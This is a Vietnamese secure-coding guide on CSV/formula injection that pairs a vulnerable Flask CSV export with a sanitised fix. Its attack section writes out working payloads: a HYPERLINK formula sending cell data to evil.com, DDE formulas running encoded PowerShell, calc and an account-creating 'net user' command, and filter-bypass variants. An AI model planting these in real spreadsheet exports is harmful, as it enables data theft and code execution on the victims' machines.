# CSV/Formula Injection

> **CWE**: CWE-1236 | **Phân loại**: Injection

## Kiến thức Nền tảng

Hãy nghĩ về file CSV giống như một danh sách văn bản đơn giản được ngăn cách bởi các dấu phẩy. Khi bạn mở file này bằng các công cụ bảng tính như Microsoft Excel hay Google Sheets, các phần mềm này rất thông minh: nếu thấy một ô dữ liệu bắt đầu bằng các ký tự như `=`, `+`, `-`, hoặc `@`, chúng sẽ tự động hiểu đó là một công thức toán học cần được tính toán ngay lập tức. Bên cạnh các phép tính thông thường, các phần mềm này còn hỗ trợ một tính năng cũ nhưng mạnh mẽ gọi là DDE (Dynamic Data Exchange) để trò chuyện và chạy các chương trình khác trên máy tính của bạn.

```python
# Normal CSV export in a Python web application
import csv
from io import StringIO

def export_users(users):
    output = StringIO()
    writer = csv.writer(output)
    
    # Write header row
    writer.writerow(["Name", "Email", "Phone"])
    
    # Write user data rows
    for user in users:
        writer.writerow([user.name, user.email, user.phone])
    
    return output.getvalue()

# Example output (safe data):
# Name,Email,Phone
# Alice,alice@corp.com,+84-123-456-789
```

Ngoài công thức Excel cơ bản (`=SUM`, `=VLOOKUP`), Excel còn hỗ trợ **DDE (Dynamic Data Exchange)** — một giao thức cũ cho phép gọi chương trình bên ngoài. Kết hợp với khả năng thực thi formula, đây là vector tấn công nguy hiểm: kẻ tấn công nhập dữ liệu chứa payload vào ứng dụng, và khi admin xuất CSV rồi mở bằng Excel, payload sẽ chạy.

## Mô tả lỗ hổng

Lỗ hổng CSV/Formula Injection xảy ra khi ứng dụng web cho phép người dùng nhập thông tin (như tên đăng ký hoặc bình luận) chứa các ký tự công thức nói trên, rồi sau đó xuất danh sách này ra file CSV cho người quản lý tải về. Khi người quản lý mở file CSV bằng Excel, phần mềm sẽ "ngây thơ" thực thi công thức độc hại ẩn giấu trong dữ liệu đó. Kẻ tấn công có thể lợi dụng điều này để chạy các lệnh phá hoại trực tiếp trên máy tính của người mở file, đánh cắp dữ liệu từ các ô khác trong bảng tính, hoặc âm thầm gửi thông tin mật ra ngoài internet. Sự nguy hiểm của lỗ hổng này nằm ở chỗ nó bắc cầu từ một lỗi bảo mật web đơn giản sang việc tấn công trực tiếp vào thiết bị cá nhân của người dùng.

## Cơ chế tấn công

**Payload 1 — Đánh cắp dữ liệu qua HYPERLINK:**

```
=HYPERLINK("https://evil.com/steal?data="&A1&"_"&B1, "Click to verify")
```
Khi nạn nhân click, giá trị ô A1 và B1 được gửi đến server kẻ tấn công qua URL.

**Payload 2 — Thực thi lệnh qua DDE (Dynamic Data Exchange):**

```
=cmd|'/C powershell -ep bypass -e JABjAD0ATgBlAHcALQBPAGIA...'!A0
```

```
+cmd|'/C calc.exe'!A0
```

**Payload 3 — Kẻ tấn công đăng ký với tên chứa payload:**

```
# Attacker registers with this "name" in the web application
Name: =cmd|'/C net user hacker P@ss123 /add'!A0
Email: attacker@evil.com
```

```csv
Name,Email,Phone
Alice,alice@corp.com,+84-123-456-789
=cmd|'/C net user hacker P@ss123 /add'!A0,attacker@evil.com,
```

Khi admin export danh sách user ra CSV và mở bằng Excel → Excel thực thi lệnh `cmd` → tạo user mới trên máy admin.

**Payload 4 — Bypass bằng các ký tự thay thế:**

```
-1+1+cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
%0A=cmd|'/C calc'!A0
```

## Biện pháp phòng thủ

- **Tóm tắt**: Làm sạch dữ liệu đầu vào trước khi xuất file CSV bằng cách thêm tiền tố an toàn vào các ký tự đặc biệt.
- **Các bước chi tiết**:
  - Thêm tiền tố `'` (single quote) trước các giá trị nguy hiểm — Excel sẽ hiểu là text thuần.
  - Validate đầu vào nghiêm ngặt, cấm hoặc loại bỏ các ký tự khởi đầu công thức (`=`, `+`, `-`, `@`).
  - Sử dụng các thư viện xuất CSV có tính năng bảo mật hoặc tự động escape dữ liệu.

## Code Example

```python
# ❌ VULNERABLE: Direct CSV export without sanitization
@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([u.name, u.email])  # Dangerous: u.name could be "=cmd|..."
    return Response(output.getvalue(), mimetype="text/csv")

# ✅ SECURE: Sanitize all fields before CSV export
FORMULA_CHARS = set("=+-@\t\r\n")

def safe_csv_value(val):
    """Neutralize potential formula injection payloads"""
    s = str(val)
    if s and s[0] in FORMULA_CHARS:
        return "'" + s  # Single-quote prefix = treat as text in Excel
    return s

@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)  # Quote all fields
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([safe_csv_value(u.name), safe_csv_value(u.email)])
    return Response(output.getvalue(), mimetype="text/csv")
```

## Xem thêm

- [Command Execution](../command-execution/) — Thực thi lệnh trực tiếp trên hệ điều hành.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/daily-swig/csv-injection
- OWASP: https://owasp.org/www-community/attacks/CSV_Injection
- CWE: https://cwe.mitre.org/data/definitions/1236.html
- James Kettle: https://www.contextis.com/en/blog/comma-separated-vulnerabilities

## Giải thích thuật ngữ

- **CSV Injection**: Tiêm công thức độc hại vào dữ liệu xuất file CSV.
- **DDE (Dynamic Data Exchange)**: Giao thức truyền dữ liệu động giữa các phần mềm trên Windows, có thể dùng để chạy file exe.
- **Spreadsheet**: Phần mềm bảng tính như Excel hoặc Google Sheets.
- **Payload**: Đoạn dữ liệu mang mục đích khai thác lỗi bảo mật.
- **Sanitize**: Quá trình làm sạch dữ liệu đầu vào để loại bỏ các ký tự đặc biệt nguy hiểm.
